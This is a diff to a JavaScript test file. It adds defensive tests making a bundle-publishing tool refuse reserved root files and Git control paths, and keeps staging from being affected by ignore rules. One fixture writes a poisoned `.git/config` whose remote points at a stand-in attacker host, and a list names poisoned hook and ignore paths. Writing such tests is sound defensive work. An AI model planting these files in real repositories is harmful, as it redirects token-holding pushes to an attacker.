@@ -269,17 +269,89 @@ test('validateBundleDir refuses a missing directory, a missing sentinel, and a g
   cleanup(noSentinel, noGroups);
 });
 
-test('validateBundleDir refuses a bundle whose reserved root carries a manifest', () => {
-  for (const reserved of ['manifest.json', 'manifest.dsse.json']) {
+test('validateBundleDir refuses a reserved bundle root: a manifest, or the provenance marker', () => {
+  // The marker is reserved for a different reason from the manifests: `writeProvenance`
+  // clobbers that exact path, so a document served there is unpublishable by construction
+  // and the host would answer a manifest-digested path with provenance bytes instead.
+  for (const reserved of ['manifest.json', 'manifest.dsse.json', '.jinn-profile-host-source']) {
     const bundle = makeBundle();
     writeFile(bundle, reserved, '{}\n');
     assert.throws(
       () => validateBundleDir(bundle, { sourceSha: SHA }),
-      new RegExp(reserved.replace('.', '\\.'), 'u'),
-      `a root ${reserved} must be refused; the live-host gate probes it as a must-404`,
+      new RegExp(reserved.replaceAll('.', '\\.'), 'u'),
+      `a root ${reserved} must be refused before it reaches the host`,
     );
     cleanup(bundle);
   }
+});
+
+test('validateBundleDir refuses a bundle carrying a Git control path at any depth', () => {
+  // `mirrorContent` copies with cpSync, whose `force` default is true, so a `.git/...`
+  // bundle entry is written INTO the host checkout's real `.git` -- and the push step, the
+  // one step holding the host token, then reads that `.git/config`. `DEFAULT_KEEP` protects
+  // `.git` from deletion only. The `.gitignore` family is the same defect quietly: Git
+  // honors those files, so they decide which attested bytes are staged and published.
+  for (const controlPath of [
+    '.git/config',
+    '.git/hooks/pre-commit',
+    '.gitignore',
+    '.gitattributes',
+    '.gitmodules',
+    'schemas/.gitignore',
+    // A case-insensitive host filesystem resolves this to the same directory, and the
+    // break-glass mirror recipe is run by hand on a laptop.
+    '.GIT/hooks/pre-commit',
+  ]) {
+    const bundle = makeBundle();
+    writeFile(bundle, controlPath, 'poisoned\n');
+    assert.throws(
+      () => validateBundleDir(bundle, { sourceSha: SHA }),
+      /Git control path/u,
+      `${controlPath} must be refused before it reaches the host checkout`,
+    );
+    cleanup(bundle);
+  }
+});
+
+test('a bundle .git path never reaches the host checkout, and nothing is mirrored first', () => {
+  const bundle = makeBundle();
+  writeFile(bundle, '.git/config', '[remote "origin"]\n\turl = https://attacker.example/x.git\n');
+  const host = makeHostRepo();
+  const headBefore = git(host, ['rev-parse', 'HEAD']).trim();
+  const configBefore = readFileSync(path.join(host, '.git/config'), 'utf8');
+
+  assert.throws(() => refresh(bundle, host), /Git control path/u);
+
+  assert.equal(readFileSync(path.join(host, '.git/config'), 'utf8'), configBefore, 'the host git config is untouched');
+  assert.equal(existsSync(path.join(host, '.git/hooks/pre-commit')), false);
+  assert.equal(git(host, ['rev-parse', 'HEAD']).trim(), headBefore);
+  assert.ok(existsSync(path.join(host, 'stale.json')), 'the gate fires before anything is mirrored');
+  cleanup(bundle, host);
+});
+
+test('staging is ignore-proof, so the published tree is the mirrored tree', () => {
+  // The second, independent half of the same defect. `validateBundleDir` refuses a
+  // bundle-CARRIED ignore file; this covers every ignore source no bundle validation can
+  // see -- the host repository's own excludes, and the runner's global config. A plain
+  // `git add -A` honors them, and would commit a tree silently missing attested documents
+  // while `treeChanged` still reported success and the push still went out.
+  const host = makeHostRepo();
+  writeFile(host, '.git/info/exclude', '*.json\n');
+  const bundle = makeBundle();
+
+  const result = refresh(bundle, host);
+
+  assert.equal(result.changed, true);
+  const published = git(host, ['ls-tree', '-r', '--name-only', 'HEAD']).split('\n');
+  for (const relativePath of [
+    'vercel.json',
+    'implementations-v1/manifest.json',
+    'sealed-platform-v1/manifest.json',
+    'schemas/task.schema.json',
+  ]) {
+    assert.ok(published.includes(relativePath), `${relativePath} must be staged despite the exclude rule`);
+  }
+  cleanup(bundle, host);
 });
 
 test('validateBundleDir refuses a manifest whose releaseGroup disagrees with its directory', () => {
